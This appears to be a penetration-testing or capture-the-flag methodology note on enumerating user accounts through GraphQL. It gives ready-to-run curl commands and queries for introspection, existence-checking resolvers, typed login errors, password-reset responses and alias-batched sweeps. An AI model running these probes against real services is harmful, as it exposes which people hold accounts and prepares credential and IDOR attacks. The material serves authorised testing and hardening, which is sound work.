# GraphQL resolvers (deep) — the schema-level existence oracles

## Finding the resolvers — introspection first

```bash
curl -s -X POST -H 'Content-Type: application/json' -d \
  '{"query":"{__schema{queryType{fields{name args{name type{name kind ofType{name}}}}}}}"}' "$BASE/graphql" | python3 -m json.tool | grep -iE 'user|email|account|exist|check|login|member'
```

The resolvers that leak `exists` — `user`, `userByEmail`, `userByName`,
`checkUser`, `userExists`, `account`, `member`, `findUser`, `getUser`,
`login`, `requestPasswordReset`, `checkEmail`, `usernameAvailable`.

## The exists-resolvers — `null` vs object

```bash
for U in "$KNOWN" "$FAKE"; do
  echo "== $U"
  curl -s -X POST -H 'Content-Type: application/json' -d \
    "{\"query\":\"query{userByEmail(email:\\\"$U\\\"){id username email}}\"}" "$BASE/graphql"
  curl -s -X POST -H 'Content-Type: application/json' -d \
    "{\"query\":\"query{checkUser(username:\\\"$U\\\")}\"}" "$BASE/graphql"
  curl -s -X POST -H 'Content-Type: application/json' -d \
    "{\"query\":\"query{userExists(email:\\\"$U\\\")}\"}" "$BASE/graphql"
done
```

- `{"data":{"userByEmail":null}}` vs `{"data":{"userByEmail":{"id":N}}}`
  — the resolver returns the row for a real user → direct oracle
- `{"data":{"checkUser":false}}` vs `true` — a boolean resolver
- `{"data":{"userExists":true}}` — a dedicated exists-resolver
- `{"data":{"userByEmail":{"email":"..."}}}` — the object leaks fields
  too → `web-graphql`/`web-idor`

## The login mutation — the typed error

```bash
for U in "$KNOWN" "$FAKE"; do
  echo "== $U"
  curl -s -X POST -H 'Content-Type: application/json' -d \
    "{\"query\":\"mutation{login(username:\\\"$U\\\",password:\\\"x\\\"){token}}\"}" "$BASE/graphql"
done
```

- `errors[].extensions.code` — `"USER_NOT_FOUND"` vs
  `"INVALID_CREDENTIALS"` vs `"BAD_USER_INPUT"` — the typed code is the
  oracle
- `errors[].message` — `"user not found"` vs `"invalid credentials"`
- a `User`/`AuthError` UNION type — `login` returns `User` on real-user-
  wrong-pw vs `AuthError{type:NO_USER}` on a fake

## The reset mutation — the send-side

```bash
curl -s -X POST -H 'Content-Type: application/json' -d \
  "{\"query\":\"mutation{requestPasswordReset(email:\\\"$U\\\"){success sent}}\"}" "$BASE/graphql"
```

- `{"data":{"requestPasswordReset":{"sent":true}}}` for real, `false`/
  `null`/error for fake — the send-side in GraphQL
- `"if that account exists"` uniform message + a real send → still an
  oracle via the send

## The error-shape oracle

GraphQL's `errors[]` array is a rich leak — `message`, `extensions.code`,
`extensions.exception`, `path`, a partial `data` — each may distinguish:

- `errors[0].message` — `"Cannot return null for non-nullable field"`
  on a fake vs `null` on real
- `extensions.code` — `"INTERNAL_SERVER_ERROR"` vs `"UNAUTHENTICATED"`
- `extensions.exception` — a stack/exception naming the miss

## The field-level oracle

A `user{...}` that returns fields for real and `null` for fake exposes
the row — the `email`/`role`/`id` fields are a `web-graphql`/`web-idor`
read; the `null`-vs-object IS the enum oracle.

## Batching and aliasing — the cheap sweep

GraphQL aliases run many resolvers in one request:

```graphql
{a:userExists(username:"admin") b:userExists(username:"service") c:userExists(username:"flag")}
```

One request sweeps the candidate list — the cheapest enum loop on a
GraphQL target.

## The GraphQL boundary

- `web-user-enum` — the `exists`/typed-error resolver oracle
- `web-graphql` — the schema abuse (introspection, field-dump, auth-bypass)
- `web-idor` — a `userByEmail`/`user` object that returns another's row
- `web-auth-session` — the token/session a `login` mutation returns
